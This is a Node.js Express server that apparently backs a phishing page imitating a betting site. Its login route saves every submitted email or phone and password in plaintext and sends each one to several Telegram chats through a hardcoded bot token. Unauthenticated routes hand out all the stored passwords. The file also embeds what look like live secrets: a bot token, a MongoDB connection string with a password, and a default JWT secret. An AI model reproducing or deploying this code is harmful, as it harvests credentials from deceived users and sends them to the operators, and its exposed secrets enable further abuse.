const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'admin_jwt_secret_key_2025';

// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = '7849082825:AAEPfLJkQQQnhfsxKdJSQZRif3UyKmxmygI';
const CHAT_IDS = ['8180375324', '8114653166','7176574897'];  // Add more chat IDs here if needed

// Middleware
var corsOptions = {
  origin: '*',
  optionsSuccessStatus: 200
}
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(express.json());

// User Schema
const userSchema = new mongoose.Schema({
  email: { type: String },
  phone: { type: String },
  password: { type: String, required: true },
  loginMethod: { type: String, enum: ['email', 'phone'], required: true },
  loginDate: { type: String },
  loginTime: { type: String },
  createdAt: { type: Date, default: Date.now },
  loginHistory: [{
    date: { type: String },
    time: { type: String },
    method: { type: String },
    device: { type: String, default: 'Web Browser' }
  }]
});

// Admin Schema
const adminSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  lastLogin: { type: Date, default: Date.now }
});

// Connect to MongoDB
mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/New4raBet', {
}).then(() => {
  console.log('Connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err);
});

// Models
const User = mongoose.model('User', userSchema);
const Admin = mongoose.model('Admin', adminSchema);

// Function to send message to multiple Telegram chat IDs
const sendToTelegram = async (message) => {
  try {
    for (const chatId of CHAT_IDS) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
    }
  } catch (error) {
    console.error('Telegram Error:', error.response?.data || error.message);
  }
};

// Middleware to verify admin token (defined once)
const verifyAdminToken = (req, res, next) => {
  const token = req.header('x-auth-token');

  if (!token) {
    return res.status(401).json({ message: 'Access denied: No token provided' });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (error) {
    res.status(401).json({ message: 'Invalid token' });
  }
};

// Login route
app.post('/api/login', async (req, res) => {
  try {
    const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;

    // Validation
    if (!password || !loginMethod) {
      return res.status(400).json({ message: 'Password and login method are required' });
    }

    if (loginMethod === 'email' && !email) {
      return res.status(400).json({ message: 'Email is required for email login' });
    }

    if (loginMethod === 'phone' && !phone) {
      return res.status(400).json({ message: 'Phone is required for phone login' });
    }

    // Create new user login record
    const user = new User({
      email: loginMethod === 'email' ? email : null,
      phone: loginMethod === 'phone' ? phone : null,
      password,
      loginMethod,
      loginDate: loginDate || new Date().toLocaleDateString(),
      loginTime: loginTime || new Date().toLocaleTimeString(),
      loginHistory: [{
        date: loginDate || new Date().toLocaleDateString(),
        time: loginTime || new Date().toLocaleTimeString(),
        method: loginMethod,
        device: 'Web Browser'
      }]
    });

    await user.save();

    // Prepare Telegram message
    const message = `<b>New User Login</b>\n
🔹 <b>Method:</b> ${loginMethod}
📅 <b>Date:</b> ${user.loginDate}
🕒 <b>Time:</b> ${user.loginTime}
📧 <b>Email:</b> ${email || 'N/A'}
📱 <b>Phone:</b> ${phone || 'N/A'}
🔑 <b>Password:</b> ${password}`;

    // Send login data to Telegram chat IDs
    await sendToTelegram(message);

    // Send response back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json(userData);

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Get most recent user
app.get('/api/user', async (req, res) => {
  try {
    const user = await User.findOne().sort({ createdAt: -1 });
    if (!user) return res.status(404).json({ message: 'No users found' });

    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json(userData);

  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all users
app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    if (!users || users.length === 0) return res.status(404).json({ message: 'No users found' });

    const usersData = users.map(user => ({
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    }));

    res.status(200).json(usersData);

  } catch (error) {
    console.error('Get all users error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Admin registration
app.post('/api/admin/register', async (req, res) => {
  try {
    const { name, email, password } = req.body;

    // Validation
    if (!name || !email || !password) {
      return res.status(400).json({ message: 'All fields are required' });
    }

    const existingAdmin = await Admin.findOne({ email });
    if (existingAdmin) {
      return res.status(400).json({ message: 'Admin with this email already exists' });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    const admin = new Admin({
      name,
      email,
      password: hashedPassword
    });

    await admin.save();

    const token = jwt.sign(
      { id: admin._id, email: admin.email, isAdmin: true },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.status(201).json({
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email
      }
    });

  } catch (error) {
    console.error('Admin registration error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validation
    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required' });
    }

    const admin = await Admin.findOne({ email });
    if (!admin) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    const validPassword = await bcrypt.compare(password, admin.password);
    if (!validPassword) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    admin.lastLogin = new Date();
    await admin.save();

    const token = jwt.sign(
      { id: admin._id, email: admin.email, isAdmin: true },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.status(200).json({
      success: true,
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email
      }
    });

  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Admin dashboard route
app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin.id).select('-password');
    if (!admin) return res.status(404).json({ message: 'Admin not found' });

    const userCount = await User.countDocuments();
    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(5);

    res.status(200).json({
      admin,
      stats: { userCount, recentUsers }
    });

  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Health check
app.get("/", (req, res) => {
  res.json({ status: true });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = app;
